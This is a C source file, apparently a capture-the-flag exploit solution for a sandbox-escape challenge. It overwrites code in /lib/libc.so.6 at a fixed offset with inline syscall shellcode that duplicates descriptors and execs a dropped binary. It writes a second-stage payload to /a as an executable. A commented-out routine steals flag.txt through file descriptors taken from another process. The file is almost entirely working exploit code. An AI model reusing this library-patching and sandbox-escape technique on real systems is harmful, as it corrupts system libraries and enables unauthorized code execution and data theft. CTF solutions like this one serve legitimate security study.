/*
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */



#define _GNU_SOURCE

#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

#include "solution2.inc"


void disable_prctl() {
	int ret;
	__asm__ (	
		"syscall;"
	    : "=a"(ret)
	    : "0" (__NR_dup), "D" (100)
	    : "cc", "rcx", "r11", "memory"
	);

	__asm__ (	
		"syscall;"
	    : "=a"(ret)
	    : "0" (__NR_dup), "D" (101)
	    : "cc", "rcx", "r11", "memory"
	);

	__asm__ (	
		"push $0x612f;"
		"mov %%rsp, %%rdi;"
		"xor %%rsi, %%rsi;"
		"xor %%rdx, %%rdx;"
		"syscall;"
	    : "=a"(ret)
	    : "0" (__NR_execve)
	    : "cc", "rcx", "r11", "memory"
	);
}

int recv_fd(int chan) {
  char buf[1] = {0};
  struct iovec data = {.iov_base = buf, .iov_len = 1};
  struct msghdr msg = {0};

  msg.msg_iov = &data;
  msg.msg_iovlen = 1;

  char ctl_buf[CMSG_SPACE(sizeof(int))];
  msg.msg_control = ctl_buf;
  msg.msg_controllen = sizeof(ctl_buf);

  ssize_t recv_len = recvmsg(chan, &msg, 0);

  for (struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg); cmsg != NULL; cmsg = CMSG_NXTHDR(&msg, cmsg)) {
    if (cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
      int fd = *(int *) CMSG_DATA(cmsg);
      return fd;
    }
  }
  return -1;
}

void copy_fd(int in, int out) {
  ssize_t read_cnt;
  char buf[4096];
  while ((read_cnt = read(in, buf, sizeof(buf))) > 0) {
    if (write(out, buf, read_cnt) != read_cnt) {
      return;
    }
  }
}

int main(){
	int fd = open("/lib/libc.so.6", O_WRONLY);
	if(fd < 0) {
		perror("open libc failed");
		exit(1);
	}

	// off_t off = 0xf2f90;
	off_t off = 0x106510; 
	lseek(fd, off, SEEK_SET);
	char* buf = (char*)disable_prctl;
	ssize_t ret = write(fd, buf, 100);
	if(ret <= 0) {
		perror("write to libc failed");
	}
	close(fd);


	fd = open("/a", O_WRONLY|O_CREAT, 0755);
	write(fd, sol2, sizeof(sol2));
	close(fd);

	// if(fork() == 0) {
	// 	setsid();
	// 	while(1) {
	// 		int fd = open("/proc/4/fd/101", O_RDWR);
	// 		if(fd < 0) {
	// 			sleep(1);
	// 			continue;
	// 		} else {
	// 			int sandbox = open("/proc/4/fd/100", O_RDWR);
	// 			char* dirname = ".\0";
	// 			write(fd, dirname, 2);
				
	// 			int dir = recv_fd(fd);
	// 			fchdir(dir);

	// 			int flag = open("flag.txt", O_RDONLY);
	// 			copy_fd(flag, sandbox);
	// 			return 1;
	// 		}
	// 	}
	// }

	return 0;
}
